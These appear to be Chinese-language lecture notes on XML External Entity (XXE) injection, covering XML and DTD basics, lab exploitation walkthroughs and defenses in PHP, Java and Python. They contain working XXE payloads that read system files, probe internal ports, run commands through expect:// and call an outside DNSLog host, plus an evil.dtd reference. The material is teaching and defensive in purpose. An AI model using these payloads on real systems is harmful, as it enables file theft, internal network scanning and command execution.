# 课程大纲 

1. XML基础知识 
2. 什么是XXE 
3. XXE利用方式 
4. XXE防御

# XML基础知识

## XML

e**X**tensible **M**arkup **L**anguage 

可扩展标记语言

## XML用途

### 配置文件

![image-20221125151509717](https://image.201068.xyz/assets/image-20221125151509717.png)

### 交换数据

![image-20221125151538936](https://image.201068.xyz/assets/image-20221125151538936.png)

## XML内容

![image-20221125151603048](https://image.201068.xyz/assets/image-20221125151603048.png)

### XML格式要求

- XML文档必须有**根元素** 
-  XML文档必须有**关闭标签**
-  XML标签对**大小写**敏感 
-  XML元素必须被**正确的嵌套** 
-  XML属性必须**加引号**

### XML格式校验

DTD（Document Type Definition ） 

文档类型定义

### DTD内容之元素

![image-20221125151800051](https://image.201068.xyz/assets/image-20221125151800051.png)

元素 ：ELEMENT

### DTD内容之实体

![image-20221125151825720](https://image.201068.xyz/assets/image-20221125151825720.png)

实体 ：ENTITY

### 实体ENTITY的使用

![image-20221125151901913](https://image.201068.xyz/assets/image-20221125151901913.png)

内部实体 

INTERNAL [ɪnˈtɜːnl] ENTI

### 外部实体ENTITY的使用

![image-20221125155403447](https://image.201068.xyz/assets/image-20221125155403447.png)

### 外部实体引用：协议

| 协议 | 使用方式                                                   |
| ---- | ---------------------------------------------------------- |
| file | file:///etc//passwd                                        |
| php  | php://filter/read=convert.base64-encode/resource=index.php |
| http | http//:wuya.com/evil.dtd                                   |

##### 不同语言支持的协议

| Libxml2       | PHP                                                          | Java                                           | .NET                |
| ------------- | ------------------------------------------------------------ | ---------------------------------------------- | ------------------- |
| file http ftp | file http ftp php compress.zlib compress.bzip2 data glob phar | file http https ftp jar netdoc mailto gopher * | file http https ftp |

#####  PHP扩展

| Schema                                              | Extension Required |
| --------------------------------------------------- | ------------------ |
| https ftps                                          | openssl            |
| zip                                                 | zip                |
| ssh2.shell ssh2.exec ssh2.tunnel ssh2.sftp ssh2.scp | ssh2               |
| rar                                                 | rar                |
| ogg                                                 | oggvorbis          |
| expect                                              | expect             |

### 完整的XML内容

![image-20221125165532725](https://image.201068.xyz/assets/image-20221125165532725.png)

# 什么是XXE

## XXE 

![image-20221125165741902](https://image.201068.xyz/assets/image-20221125165741902.png)

XML外部实体注入 

XML External Entity Injection

## XXE定义

如果Web应用的脚本代码没有限制XML引入外部实体，

从而导致用户可以插入一个**外部实体**，

并且其中的内容会被服务器端执行，



插入的代码可能导致:

- 任意文件读取、
- 系统命令执行、
- 内网端口探测、
- 攻击内网网站等危害。

读取文件

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note[
<!ENTITY xxe SYSTEM "file:///C:/Windows/system.ini">]> 
<login>&xxe;</login>
```

探测端口

```php
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note[
    <!ENTITY xxe SYSTEM "http://192.168.31.193:8092">]> 
<login>&xxe;</login>
```

执行命令

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note[
<!ENTITY xxe SYSTEM "expect://ipconfig">]> 
<login>&xxe;</login>
```

# XXE利用方式

## 微信支付XXE漏洞

![image-20221125175513874](https://image.201068.xyz/assets/image-20221125175513874.png)

## 微信支付XXE漏洞

![image-20221125175530987](https://image.201068.xyz/assets/image-20221125175530987.png)

## 直打：xxe靶场

访问：http://192.168.31.193:8093/php_xxe/

### 流程

#### 确定使用XML传输数据（抓包可得）

![image-20221125184636443](https://image.201068.xyz/assets/image-20221125184636443.png)

![image-20221125185102619](https://image.201068.xyz/assets/image-20221125185102619.png)



#### 发送到Repeater

![image-20221125190021144](https://image.201068.xyz/assets/image-20221125190021144.png)

#### 添加DTD，引用外部问文档

```xml
<!DOCTYPE a[
<!ENTITY xxe SYSTEM "file:///C:/Windows/system.ini">
]> 
<user>
   <username>
	11  &xxe;
   </username>
   <password>
	1
  </password>
</user>
```

#### Send得到响应

![image-20221125185444129](https://image.201068.xyz/assets/image-20221125185444129.png)

![image-20221125190115068](https://image.201068.xyz/assets/image-20221125190115068.png)

### 盲打-DNSLog

![image-20221125191451126](https://image.201068.xyz/assets/image-20221125191451126.png)

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a[
<!ENTITY % remote SYSTEM "http://test.bep1pi.dnslog.cn">%remote;]>
```

![image-20221125191612095](https://image.201068.xyz/assets/image-20221125191612095.png)

![image-20221125191645864](https://image.201068.xyz/assets/image-20221125191645864.png)

### 盲打-http接口参数，写入文件

![image-20221125183019656](https://image.201068.xyz/assets/image-20221125183019656.png)

## pikachu靶场

http://192.168.70.130/vul/xxe/xxe_1.php

```
<?xml version="1.0"?>  
<!DOCTYPE foo [     
<!ENTITY xxe "哈哈" > ]>  
<foo>&xxe;</foo>
```

![image-20221125194627357](https://image.201068.xyz/assets/image-20221125194627357.png)

# XXE 防御

## PHP

libxml_disable_entity_loader(true);

## Java

DocumentBuilderFactory dbf 

=DocumentBuilderFactory.newInstance(); 

dbf.setExpandEntityReferences(false);

## Python 

from lxml import etree 

xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))

## 过滤用户提交的XML数据

`'` 

`"` 

`''(two apostrophe)` 

`""` 

`< >`

 `]]>` 

`]]>>` 

`<!--/-->`

`/-->` 

`-->`

`<!--` 

`<!`
`<! [CDATA[/]]`

## WAF

以mod_security为例
